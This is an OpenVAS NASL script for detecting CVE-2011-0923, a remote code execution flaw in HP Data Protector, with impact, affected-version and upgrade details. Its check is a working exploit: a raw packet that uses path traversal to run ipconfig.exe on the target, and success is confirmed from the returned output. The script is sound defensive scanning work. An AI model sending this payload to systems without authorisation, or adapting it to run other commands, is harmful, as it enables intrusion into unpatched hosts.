###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_data_protector_exec_cmd_code_exec_vuln.nasl 7203 2017-09-20 13:01:39Z cfischer $
#
# HP (OpenView Storage) Data Protector Client 'EXEC_CMD' Remote Code Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801946");
  script_version("$Revision: 7203 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-20 15:01:39 +0200 (Wed, 20 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2011-0923");
  script_bugtraq_id(46234);
  script_name("HP (OpenView Storage) Data Protector Client 'EXEC_CMD' Remote Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555);
  script_mandatory_keys("hp_data_protector/installed");

  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-055/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101766/hpdp-exec.txt");
  script_xref(name:"URL", value:"http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143");

  tag_impact = "Successful exploitation will allow remote attackers to execute
  arbitrary Perl code via a crafted command.

  Impact Level: Application.";

  tag_affected = "HP (OpenView Storage) Data Protector 6.11 and prior.";

  tag_insight = "The specific flaw exists within the filtering of arguments to
  the 'EXEC_CMD' command. which allows remote connections to execute files within
  it's local bin directory.";

  tag_solution = "Upgrade to HP (OpenView Storage) Data Protector A.06.20 or later, For updates refer to
  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html";

  tag_summary = "This host is installed with HP (OpenView Storage) Data Protector and is prone to
  remote code execution vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection NVT within the GSA

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

##  Construct attack string (ipconfig)
req = raw_string(0x00, 0x00, 0x00, 0xa4, 0x20, 0x32, 0x00, 0x20,
                 0x66, 0x64, 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75,
                 0x00, 0x20, 0x30, 0x00, 0x20, 0x53, 0x59, 0x53,
                 0x54, 0x45, 0x4d, 0x00, 0x20, 0x66, 0x64, 0x69,
                 0x73, 0x6b, 0x79, 0x6f, 0x75, 0x00, 0x20, 0x43,
                 0x00, 0x20, 0x32, 0x30, 0x00, 0x20, 0x66, 0x64,
                 0x69, 0x73, 0x6b, 0x79, 0x6f, 0x75, 0x00, 0x20,
                 0x50, 0x6f, 0x63, 0x00, 0x20, 0x4e, 0x54, 0x41,
                 0x55, 0x54, 0x48, 0x4f, 0x52, 0x49, 0x54, 0x59,
                 0x00, 0x20, 0x4e, 0x54, 0x41, 0x55, 0x54, 0x48,
                 0x4f, 0x52, 0x49, 0x54, 0x59, 0x00, 0x20, 0x4e,
                 0x54, 0x41, 0x55, 0x54, 0x48, 0x4f, 0x52, 0x49,
                 0x54, 0x59, 0x00, 0x20, 0x30, 0x00, 0x20, 0x30,
                 0x00, 0x20, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e,
                 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e,
                 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73,
                 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
                 0x32, 0x5c, 0x69, 0x70, 0x63, 0x6f, 0x6e, 0x66,
                 0x69, 0x67, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00);

## send the data
send( socket:soc, data:req );

## wait for 5 sec
sleep( 5 );

## Receive the data
res = recv( socket:soc, length:4096 );

## Get the response length
len = strlen( res );
if( ! len ) exit( 0 );

data = "";

## Iterate response by each characters
for( i = 0; i < len; i = i + 1 ) {
  ## Get only Characters from response
  if( ( ord( res[i] ) >= 61 ) ) {
    data = data + res[i];
  }
}

close( soc );

## Confirm the exploit
if( "WindowsIPConfiguration" >< data && "EthernetadapterLocalAreaConnection" >< data ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );